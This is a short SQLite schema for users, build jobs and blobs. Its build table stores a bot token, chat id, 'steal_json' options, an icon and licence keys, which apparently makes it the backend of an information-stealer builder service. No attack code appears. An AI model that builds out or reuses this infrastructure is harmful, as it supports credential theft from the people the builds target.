CREATE TABLE IF NOT EXISTS users (
  id TEXT PRIMARY KEY, username TEXT UNIQUE NOT NULL, pw_hash TEXT NOT NULL,
  pw_salt TEXT NOT NULL, role TEXT NOT NULL DEFAULT 'user', disabled INTEGER NOT NULL DEFAULT 0,
  created REAL NOT NULL);
CREATE TABLE IF NOT EXISTS builds (
  id TEXT PRIMARY KEY, uid TEXT NOT NULL, username TEXT NOT NULL, status TEXT NOT NULL,
  created REAL NOT NULL, claimed_by TEXT, error TEXT, artifact INTEGER NOT NULL DEFAULT 0,
  bot_token TEXT, chat_id TEXT, name TEXT, licence_key TEXT, licence_url TEXT,
  steal_json TEXT, opts_json TEXT, icon_b64 TEXT);
CREATE INDEX IF NOT EXISTS idx_builds_uid ON builds(uid);
CREATE INDEX IF NOT EXISTS idx_builds_status ON builds(status);
CREATE TABLE IF NOT EXISTS blobs (id TEXT PRIMARY KEY, data TEXT NOT NULL);
